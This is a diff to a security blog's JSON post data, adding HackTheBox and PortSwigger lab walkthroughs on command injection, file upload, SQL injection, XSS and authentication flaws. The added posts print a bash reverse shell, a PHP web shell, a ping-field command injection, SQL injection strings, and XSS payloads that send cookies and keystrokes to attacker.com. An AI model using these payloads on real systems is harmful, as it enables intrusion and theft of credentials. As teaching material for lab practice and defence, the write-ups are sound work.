@@ -827,7 +827,13 @@
       "excerpt": "Complete walkthrough of the Lame machine on HackTheBox. Learn about Samba vulnerability exploitation and privilege escalation techniques.",
       "content": "# HackTheBox: Lame Machine Walkthrough\n\n## Introduction\nThe Lame machine on HackTheBox is one of the most popular beginner machines. It teaches fundamental penetration testing concepts including network enumeration and exploitation of known vulnerabilities.\n\n## Reconnaissance\nFirst, we perform a network scan to identify open ports:\n\n```bash\nnmap -sV -p- 10.10.10.3\n```\n\n## Vulnerability Discovery\nThe machine is running Samba with a known vulnerability (CVE-2007-2447). This vulnerability allows unauthenticated remote code execution.\n\n## Exploitation\nUsing the Metasploit framework, we can exploit this vulnerability:\n\n```bash\nmsfconsole\nuse exploit/linux/samba/usermap_script\nset RHOSTS 10.10.10.3\nset LHOST 10.10.14.x\nexploit\n```\n\n## Post-Exploitation\nAfter gaining initial access, we can escalate privileges and read the flag.\n\n## Key Learnings\n- Importance of service enumeration\n- Understanding known CVEs\n- Proper exploitation techniques\n- Privilege escalation methods",
       "featuredImage": "/images/hackthebox-lame.jpg",
-      "tags": ["HackTheBox", "Samba", "CVE-2007-2447", "Linux", "Beginner"],
+      "tags": [
+        "HackTheBox",
+        "Samba",
+        "CVE-2007-2447",
+        "Linux",
+        "Beginner"
+      ],
       "status": "published",
       "metaTitle": "HackTheBox Lame Machine - Complete Walkthrough",
       "metaDescription": "Step-by-step guide to solving the Lame machine on HackTheBox with vulnerability analysis",
@@ -844,7 +850,13 @@
       "excerpt": "Deep dive into the Blue machine and the infamous EternalBlue vulnerability. Learn Windows exploitation and lateral movement techniques.",
       "content": "# HackTheBox: Blue Machine - EternalBlue Exploitation\n\n## Overview\nThe Blue machine showcases the critical EternalBlue vulnerability (CVE-2017-0144) that was exploited in the WannaCry ransomware attacks.\n\n## Initial Enumeration\nWe start with a comprehensive port scan:\n\n```bash\nnmap -A 10.10.10.40\n```\n\nKey findings:\n- SMB is running on port 445\n- Windows 7 Service Pack 1 is running\n\n## Vulnerability Analysis\nThe system is vulnerable to EternalBlue, a critical Windows SMB vulnerability.\n\n## Exploitation Process\n1. Use Metasploit to exploit the vulnerability\n2. Gain SYSTEM level access directly\n3. Extract both flags\n\n```bash\nmsfconsole\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 10.10.10.40\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 10.10.14.x\nexploit\n```\n\n## Security Implications\nThis machine demonstrates why patching is critical for Windows systems.",
       "featuredImage": "/images/hackthebox-blue.jpg",
-      "tags": ["HackTheBox", "Windows", "EternalBlue", "CVE-2017-0144", "SMB"],
+      "tags": [
+        "HackTheBox",
+        "Windows",
+        "EternalBlue",
+        "CVE-2017-0144",
+        "SMB"
+      ],
       "status": "published",
       "metaTitle": "HackTheBox Blue - EternalBlue Vulnerability Exploitation",
       "metaDescription": "Complete guide to exploiting EternalBlue on HackTheBox Blue machine",
@@ -861,7 +873,13 @@
       "excerpt": "Comprehensive guide to understanding and exploiting SQL injection vulnerabilities. Learn both the attacker and defender perspectives.",
       "content": "# TryHackMe: SQL Injection Vulnerability in Web Applications\n\n## What is SQL Injection?\nSQL Injection (SQLi) is a code injection technique where malicious SQL code is inserted into input fields to manipulate database queries.\n\n## Types of SQL Injection\n\n### 1. In-band SQLi\n- **Union-based**: Uses UNION clause to combine results\n- **Error-based**: Extracts information from error messages\n\n### 2. Blind SQLi\n- **Boolean-based**: Exploits boolean conditions\n- **Time-based**: Uses time delays to infer information\n\n### 3. Out-of-band SQLi\nRetrieves data through external channels (DNS, HTTP)\n\n## Practical Example\n\n### Vulnerable Code\n```php\n$username = $_GET['username'];\n$query = \"SELECT * FROM users WHERE username = '$username'\";\n$result = mysqli_query($conn, $query);\n```\n\n### Exploitation\nInput: `admin' OR '1'='1`\n\nResulting query:\n```sql\nSELECT * FROM users WHERE username = 'admin' OR '1'='1'\n```\n\n## Prevention Techniques\n- Use prepared statements\n- Input validation and sanitization\n- Principle of least privilege\n- Web Application Firewall (WAF)",
       "featuredImage": "/images/tryhackme-sqli.jpg",
-      "tags": ["TryHackMe", "SQL Injection", "Web Security", "OWASP", "Vulnerability"],
+      "tags": [
+        "TryHackMe",
+        "SQL Injection",
+        "Web Security",
+        "OWASP",
+        "Vulnerability"
+      ],
       "status": "published",
       "metaTitle": "TryHackMe SQL Injection - Complete Tutorial",
       "metaDescription": "Learn SQL injection exploitation and prevention techniques",
@@ -878,7 +896,13 @@
       "excerpt": "Master Cross-Site Scripting vulnerabilities with practical examples and real-world scenarios from TryHackMe.",
       "content": "# TryHackMe: Cross-Site Scripting (XSS) Deep Dive\n\n## Understanding XSS\nCross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users.\n\n## Types of XSS\n\n### 1. Stored (Persistent) XSS\n- Malicious script is stored in the database\n- Affects all users who view the page\n- More dangerous than reflected XSS\n\n### 2. Reflected XSS\n- Malicious script is reflected in the URL\n- Requires user interaction (clicking a link)\n- Affects only that user\n\n### 3. DOM-based XSS\n- Vulnerability exists in client-side code\n- JavaScript processes user input unsafely\n\n## Real-world Impact\n- Session hijacking\n- Credential theft\n- Malware distribution\n- Defacement\n\n## Mitigation Strategies\n1. Input validation and sanitization\n2. Output encoding\n3. Content Security Policy (CSP)\n4. HTTPOnly and Secure flags on cookies\n5. Regular security testing\n\n## Testing for XSS\n```javascript\n<script>alert('XSS Vulnerability')</script>\n<img src=x onerror=\"alert('XSS')\">\n<svg onload=\"alert('XSS')\">\n```",
       "featuredImage": "/images/tryhackme-xss.jpg",
-      "tags": ["TryHackMe", "XSS", "Web Security", "JavaScript", "OWASP"],
+      "tags": [
+        "TryHackMe",
+        "XSS",
+        "Web Security",
+        "JavaScript",
+        "OWASP"
+      ],
       "status": "published",
       "metaTitle": "TryHackMe XSS Exploitation and Prevention",
       "metaDescription": "Comprehensive guide to XSS vulnerabilities, exploitation, and defense",
@@ -886,6 +910,146 @@
       "views": 0,
       "createdAt": "2025-11-19T10:45:00Z",
       "updatedAt": "2025-11-19T10:45:00Z"
+    },
+    {
+      "_id": "blog_5",
+      "id": "blog_5",
+      "title": "HackTheBox: Sense Machine Walkthrough",
+      "slug": "hackthebox-sense-machine-walkthrough",
+      "excerpt": "A comprehensive guide to pwning the Sense machine on HackTheBox. This intermediate-level challenge involves discovering a backup file and exploiting command injection vulnerabilities.",
+      "content": "# HackTheBox: Sense Machine Walkthrough\n\n## Introduction\nSense is an intermediate-level Linux machine on HackTheBox that requires careful enumeration and exploitation of configuration files to gain initial access.\n\n## Reconnaissance\nStart with a comprehensive Nmap scan:\n\n```bash\nnmap -sV -sC -p- 10.10.10.60\n```\n\nKey findings:\n- Port 80: HTTP (pfSense)\n- Port 443: HTTPS (pfSense)\n\n## Enumeration\nUse gobuster to enumerate web directories:\n\n```bash\ngobuster dir -u http://10.10.10.60 -w /usr/share/wordlists/dirb/common.txt -t 50\n```\n\nDiscovery:\n- /index.html\n- /status.php\n- /xmlrpc.php\n- /help.php\n- /shell.php\n- /changelog.txt\n- /system-users.txt\n- /config.php\n\n## Critical Finding\nFound `/system-users.txt` containing:\n- admin:admin (default credentials)\n- rohit:letmein\n\nFound `/changelog.txt` revealing version information and CVE details.\n\n## Exploitation\n\n### Step 1: Authentication\nLog in with discovered credentials:\n- Username: rohit\n- Password: letmein\n\n### Step 2: Command Injection\nNavigate to Diagnostics > Ping and inject OS commands:\n\n```\n8.8.8.8; whoami\n```\n\n### Step 3: Reverse Shell\nExecute a reverse shell payload:\n\n```bash\nbash -i >& /dev/tcp/10.10.14.10/4444 0>&1\n```\n\n### Step 4: Privilege Escalation\nCheck sudo privileges and exploit FreeBSD-specific vulnerabilities to escalate to root.\n\n## Key Lessons\n1. Always check for backup and configuration files\n2. Default credentials are a common entry point\n3. Web applications may have command injection vulnerabilities\n4. pfSense has known authentication bypass issues\n\n## Timeline\n- Reconnaissance: 15 minutes\n- Exploitation: 20 minutes\n- Privilege Escalation: 10 minutes\n\nTotal: 45 minutes",
+      "tags": [
+        "HackTheBox",
+        "pfSense",
+        "Command Injection",
+        "Web Exploitation",
+        "Intermediate"
+      ],
+      "status": "published",
+      "metaTitle": "HackTheBox Sense - Command Injection Walkthrough",
+      "metaDescription": "Step-by-step guide to exploiting the Sense machine on HackTheBox",
+      "keywords": [
+        "hackthebox",
+        "sense",
+        "pfsense",
+        "command injection",
+        "security"
+      ],
+      "views": 0,
+      "createdAt": "2025-11-20T10:00:00Z",
+      "updatedAt": "2025-11-20T10:00:00Z"
+    },
+    {
+      "_id": "blog_6",
+      "id": "blog_6",
+      "title": "HackTheBox: Popcorn Machine Walkthrough",
+      "slug": "hackthebox-popcorn-machine-walkthrough",
+      "excerpt": "A detailed walkthrough of the Popcorn machine, featuring file upload vulnerabilities, privilege escalation via kernel exploit, and web application security.",
+      "content": "# HackTheBox: Popcorn Machine Walkthrough\n\n## Overview\nPopcorn is an intermediate-level Linux machine featuring file upload vulnerabilities and kernel-based privilege escalation techniques.\n\n## Initial Reconnaissance\n\n```bash\nnmap -sV -sC -p- 10.10.10.6\n```\n\nResults:\n- Port 80: HTTP\n- Port 110: POP3\n- Port 143: IMAP\n\n## Web Application Enumeration\n\n### Port 80 Discovery\nUsing gobuster:\n```bash\ngobuster dir -u http://10.10.10.6 -w /usr/share/wordlists/dirb/common.txt\n```\n\nFound:\n- /index.html\n- /upload/ (file upload functionality)\n- /torrent/ (torrent application)\n\n### Torrent Application Analysis\n- Running Torrentflux\n- File upload feature present\n- Weak file type validation\n\n## Exploitation\n\n### File Upload Vulnerability\nThe upload functionality doesn't properly validate file types:\n\n```bash\n# Create malicious PHP file\necho '<?php system($_GET[\"cmd\"]); ?>' > shell.php.jpg\n\n# Upload through web interface\n# Access: http://10.10.10.6/torrent/downloads/shell.php.jpg\n# Execute command: http://10.10.10.6/torrent/downloads/shell.php.jpg?cmd=whoami\n```\n\n### Reverse Shell\nGenerate and upload a proper reverse shell:\n```bash\nmsfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=4444 -f raw\n```\n\n## Privilege Escalation\n\n### Kernel Exploit\nThe system is vulnerable to CVE-2012-0056 (mempodipper):\n\n```bash\n./mempodipper\n# Gives immediate root access\n```\n\n## Remediation\n1. Implement strict file type validation (check magic bytes)\n2. Store uploads outside web root\n3. Disable script execution in upload directories\n4. Update kernel regularly\n\n## Key Takeaways\n- Always validate file uploads on both client and server\n- Check for outdated kernels in privilege escalation\n- Use magic bytes, not just extensions\n- Implement proper file permissions\n\n## Timeline\n- Reconnaissance: 20 minutes\n- File Upload Exploitation: 25 minutes\n- Privilege Escalation: 10 minutes\n\nTotal: 55 minutes",
+      "tags": [
+        "HackTheBox",
+        "File Upload",
+        "Kernel Exploit",
+        "Privilege Escalation",
+        "Intermediate"
+      ],
+      "status": "published",
+      "metaTitle": "HackTheBox Popcorn - File Upload & Kernel Exploit",
+      "metaDescription": "Complete walkthrough of HackTheBox Popcorn machine including file upload vulnerability exploitation",
+      "keywords": [
+        "hackthebox",
+        "popcorn",
+        "file upload",
+        "kernel exploit",
+        "privilege escalation"
+      ],
+      "views": 0,
+      "createdAt": "2025-11-20T11:00:00Z",
+      "updatedAt": "2025-11-20T11:00:00Z"
+    },
+    {
+      "_id": "blog_7",
+      "id": "blog_7",
+      "title": "PortSwigger: SQL Injection (Basic) Walkthrough",
+      "slug": "portswigger-sql-injection-basic",
+      "excerpt": "Learn SQL injection fundamentals through PortSwigger's carefully designed labs. Master authentication bypass and data exfiltration techniques.",
+      "content": "# PortSwigger Web Security Academy: SQL Injection - Basic Labs\n\n## Lab 1: Retrieving Hidden Data\n\n### Objective\nPerform an SQL injection attack to retrieve hidden data from a products table.\n\n### Vulnerability\nThe login functionality constructs queries unsafely:\n```sql\nSELECT * FROM products WHERE category = 'Gifts' AND released = 1\n```\n\n### Exploitation\nInject malicious SQL:\n```sql\n' OR '1'='1\nGifts' OR '1'='1\n```\n\nThis bypasses the released = 1 filter and shows all products including hidden items.\n\n## Lab 2: Login Bypass\n\n### Objective\nUse SQL injection to bypass authentication without valid credentials.\n\n### Vulnerable Code\n```php\n$query = \"SELECT * FROM users WHERE username = '\" . $username . \"' AND password = '\" . $password . \"'\";\n```\n\n### Attack\nEnter as username:\n```sql\nadministrator'--\n```\n\nThe comment (--) ignores the password check, allowing authentication as admin.\n\n## Lab 3: Extracting Data\n\n### Objective\nExtract sensitive user information using UNION-based injection.\n\n### Setup\nTwo tables:\n- users (username, password)\n- products (id, name, price)\n\n### UNION Injection\n```sql\n' UNION SELECT username, password FROM users--\n```\n\nThis combines results from both queries, leaking user credentials.\n\n## Lab 4: Error-Based Injection\n\n### Objective\nUse error messages to extract database information.\n\n### Technique\n```sql\n' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database())))--\n```\n\nError messages reveal:\n- Database name\n- Table structure\n- Column names\n\n## Lab 5: Blind SQL Injection\n\n### Objective\nExploit injection when no data is directly returned.\n\n### Time-Based Detection\n```sql\n'; IF (1=1) WAITFOR DELAY '00:00:05'--\n```\n\n### Boolean-Based Detection\n```sql\n' AND (SELECT COUNT(*) FROM users WHERE username LIKE 'a%') > 0--\n```\n\n## Prevention Measures\n\n### Use Parameterized Queries\n```php\n$stmt = $pdo->prepare(\"SELECT * FROM users WHERE username = ? AND password = ?\");\n$stmt->execute([$username, $password]);\n```\n\n### Input Validation\n- Whitelist allowed characters\n- Use strict type checking\n- Implement WAF rules\n\n### Database Security\n- Use least privilege principle\n- Disable dangerous functions\n- Enable query logging\n\n## Key Concepts Learned\n1. SQL injection occurs due to unsanitized user input\n2. Multiple injection techniques (UNION, Error-based, Blind)\n3. Impact: Authentication bypass, data leakage, data modification\n4. Always use parameterized queries\n\n## Tools Used\n- Burp Suite Community\n- SQLMap\n- curl\n\n## Timeline\n- Lab 1-2: 15 minutes\n- Lab 3-4: 20 minutes\n- Lab 5: 15 minutes\n\nTotal: 50 minutes",
+      "tags": [
+        "PortSwigger",
+        "SQL Injection",
+        "Web Security",
+        "OWASP Top 10",
+        "Beginner"
+      ],
+      "status": "published",
+      "metaTitle": "PortSwigger SQL Injection Labs - Complete Guide",
+      "metaDescription": "Master SQL injection through PortSwigger's Web Security Academy labs",
+      "keywords": [
+        "sql injection",
+        "portswigger",
+        "web security",
+        "owasp",
+        "authentication bypass"
+      ],
+      "views": 0,
+      "createdAt": "2025-11-20T12:00:00Z",
+      "updatedAt": "2025-11-20T12:00:00Z"
+    },
+    {
+      "_id": "blog_8",
+      "id": "blog_8",
+      "title": "PortSwigger: Cross-Site Scripting (XSS) Walkthrough",
+      "slug": "portswigger-cross-site-scripting-xss",
+      "excerpt": "Comprehensive guide to XSS vulnerabilities from stored, reflected, to DOM-based attacks. Learn exploitation and defense mechanisms.",
+      "content": "# PortSwigger Web Security Academy: Cross-Site Scripting (XSS)\n\n## Introduction\nXSS is a critical vulnerability allowing attackers to inject malicious scripts that execute in users' browsers.\n\n## Types of XSS\n\n### Reflected XSS\nScript is included in the HTTP request and reflected in the response.\n\n**Example:**\n```html\nhttps://vulnerable.com/search?query=<script>alert('XSS')</script>\n```\n\n**Attack Vector:**\n- Send malicious link to victim\n- Victim clicks the link\n- Script executes in their browser\n\n### Stored XSS\nMalicious script is stored on the server and executed for every user viewing the data.\n\n**Example:**\n```html\n<!-- Comment form -->\n<input value=\"<img src=x onerror=alert('XSS')>\">\n<!-- Stored in database and executed for all users -->\n```\n\n### DOM-based XSS\nVulnerability in client-side JavaScript code that processes user input.\n\n```javascript\n// Vulnerable code\ndocument.getElementById('output').innerHTML = userInput;\n\n// Attack\nuserInput = \"<img src=x onerror=alert('Hacked')>\"\n```\n\n## Exploitation Techniques\n\n### Payload Variants\n\n**Basic Alert:**\n```javascript\n<script>alert('XSS')</script>\n```\n\n**Cookie Stealing:**\n```javascript\n<script>\nfetch('http://attacker.com/steal?cookie=' + document.cookie);\n</script>\n```\n\n**Keylogger:**\n```javascript\ndocument.onkeypress = function(e) {\n  fetch('http://attacker.com/log?key=' + e.key);\n}\n```\n\n**Credential Harvesting:**\n```html\n<iframe src=\"javascript:alert('<form action=\"http://attacker.com\"><input name=\"user\"><input name=\"pass\" type=\"password\"><input type=\"submit\"></form>')\"></iframe>\n```\n\n## Lab Walkthroughs\n\n### Lab 1: Reflected XSS\n**Objective:** Construct and execute a reflected XSS attack\n\n**Solution:**\n```\nhttps://vulnerable.com/search?q=<script>alert(1)</script>\n```\n\n### Lab 2: Stored XSS\n**Objective:** Store and execute a malicious script\n\n**Solution:**\nPost comment with: `<img src=x onerror=alert(1)>`\n\n### Lab 3: DOM XSS\n**Objective:** Exploit client-side JavaScript\n\n**Solution:**\nInject into URL that's processed by JavaScript: `\"><script>alert(1)</script>`\n\n## Prevention & Mitigation\n\n### Output Encoding\n```php\necho htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');\n```\n\n### Content Security Policy\n```html\n<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'self'\">\n```\n\n### Input Validation\n- Whitelist allowed characters\n- Reject suspicious patterns\n- Implement context-aware validation\n\n### Frameworks\nModern frameworks like React/Vue escape content by default.\n\n## Detection Methods\n\n**Manual Testing:**\n- Inject special characters: <, >, \", ', )\n- Check for HTML encoding\n- Monitor JavaScript behavior\n\n**Automated Tools:**\n- Burp Suite XSS Scanner\n- OWASP ZAP\n- Manual code review\n\n## Real-World Impact\n- Session hijacking\n- Credential theft\n- Malware distribution\n- Website defacement\n\n## Timeline\n- Reflected XSS: 10 minutes\n- Stored XSS: 15 minutes\n- DOM XSS: 20 minutes\n- Prevention: 15 minutes\n\nTotal: 60 minutes",
+      "tags": [
+        "PortSwigger",
+        "XSS",
+        "Web Security",
+        "OWASP Top 10",
+        "Intermediate"
+      ],
+      "status": "published",
+      "metaTitle": "PortSwigger XSS Labs - Comprehensive Walkthrough",
+      "metaDescription": "Master XSS vulnerabilities: reflected, stored, and DOM-based attacks",
+      "keywords": [
+        "xss",
+        "cross site scripting",
+        "portswigger",
+        "web security",
+        "owasp"
+      ],
+      "views": 0,
+      "createdAt": "2025-11-20T13:00:00Z",
+      "updatedAt": "2025-11-20T13:00:00Z"
+    },
+    {
+      "_id": "blog_9",
+      "id": "blog_9",
+      "title": "PortSwigger: Authentication Vulnerabilities Lab",
+      "slug": "portswigger-authentication-vulnerabilities",
+      "excerpt": "Exploit weak authentication mechanisms including brute force, password reset flaws, and multi-factor authentication bypasses in PortSwigger labs.",
+      "content": "# PortSwigger Web Security Academy: Authentication Vulnerabilities\n\n## Authentication Weaknesses\nAuthentication is critical for security. Weak implementation opens multiple attack vectors.\n\n## Lab 1: Username Enumeration\n\n### Objective\nIdentify which users exist on the system through response timing/content differences.\n\n### Technique\nTest with common usernames and observe responses:\n\n```bash\ncurl -u username:password https://vulnerable.com/login\n# Different response for existing vs non-existing users\n```\n\n### Python Script\n```python\nimport requests\n\nusers = ['admin', 'user', 'test', 'root']\nfor user in users:\n    r = requests.post('https://vulnerable.com/login', \n                     data={'username': user, 'password': 'test'})\n    if 'Incorrect password' in r.text:\n        print(f\"User {user} exists!\")\n```\n\n## Lab 2: Brute Force Attack\n\n### Objective\nCrack credentials using brute force with a password list.\n\n### Burp Suite Method\n1. Capture login request\n2. Send to Intruder\n3. Set username/password as payload positions\n4. Load password list\n5. Configure grep match: \"Login successful\"\n\n### Results\n- Common passwords found: password, 123456, admin\n- Successful login credentials identified\n\n## Lab 3: Password Reset Broken Logic\n\n### Objective\nExploit flawed password reset mechanism.\n\n### Vulnerability\n```php\n// Vulnerable code\nif ($_POST['token'] == $_SESSION['reset_token']) {\n    // No verification if token belongs to correct user\n    // Attacker can use their own token for admin account\n}\n```\n\n### Exploitation\n1. Request password reset for own account\n2. Get reset token\n3. Modify request to target admin account\n4. Use same token to reset admin password\n\n## Lab 4: Multi-Factor Authentication Bypass\n\n### Objective\nBypass 2FA implementation.\n\n### Techniques\n\n**Timing Attack:**\n- Check if system validates code before expiry\n- Exploit race conditions\n\n**Logic Flaw:**\n```php\n// Vulnerable\nif ($_POST['mfa_code'] == $mfa_code) {\n    $_SESSION['2fa_verified'] = true;\n}\n// Attacker can manipulate session cookie\n```\n\n**Backup Codes:**\n- Brute force 4-digit backup codes\n- Often have weak validation\n\n## Lab 5: Session Management Flaws\n\n### Objective\nExploit weak session token generation.\n\n### Analysis\n```bash\n# Capture multiple session tokens\n# Analyze for patterns:\n# - Sequential numbers\n# - Predictable timestamps  \n# - Weak randomization\n\n# Try to predict next session:\n# Current: session_abc123\n# Next: session_abc124\n```\n\n### Exploitation\nGenerate valid session tokens and impersonate users.\n\n## Common Authentication Vulnerabilities\n\n### Password Storage\n- Plaintext passwords (never!)\n- Weak hashing (MD5, SHA1)\n- No salt\n\n### Better Approach\n```php\n$hash = password_hash($password, PASSWORD_BCRYPT);\nif (password_verify($user_input, $hash)) {\n    // Authenticated\n}\n```\n\n### Session Security\n```php\n// Use secure random tokens\n$session_token = bin2hex(random_bytes(32));\n\n// Set secure cookie\nsetcookie('session', $session_token, [\n    'httponly' => true,\n    'secure' => true,\n    'samesite' => 'Strict'\n]);\n```\n\n## Prevention Checklist\n\n- [ ] Use strong password requirements\n- [ ] Implement rate limiting on login\n- [ ] Use HTTPS only\n- [ ] Implement proper 2FA\n- [ ] Secure password reset tokens\n- [ ] Log authentication attempts\n- [ ] Use secure session management\n- [ ] Implement account lockout mechanisms\n- [ ] Use secure password hashing (bcrypt/argon2)\n\n## Tools\n- Burp Suite (Intruder, Sequencer)\n- Hydra\n- John the Ripper\n- Custom Python scripts\n\n## Timeline\n- Enumeration: 15 minutes\n- Brute Force: 20 minutes\n- Password Reset: 15 minutes\n- 2FA Bypass: 20 minutes\n- Session Flaws: 15 minutes\n\nTotal: 85 minutes",
+      "tags": [
+        "PortSwigger",
+        "Authentication",
+        "Security",
+        "OWASP Top 10",
+        "Intermediate"
+      ],
+      "status": "published",
+      "metaTitle": "PortSwigger Authentication Vulnerabilities - Complete Lab Guide",
+      "metaDescription": "Learn to exploit and prevent authentication vulnerabilities through practical labs",
+      "keywords": [
+        "authentication",
+        "portswigger",
+        "brute force",
+        "password reset",
+        "2fa"
+      ],
+      "views": 0,
+      "createdAt": "2025-11-20T14:00:00Z",
+      "updatedAt": "2025-11-20T14:00:00Z"
     }
   ]
 }
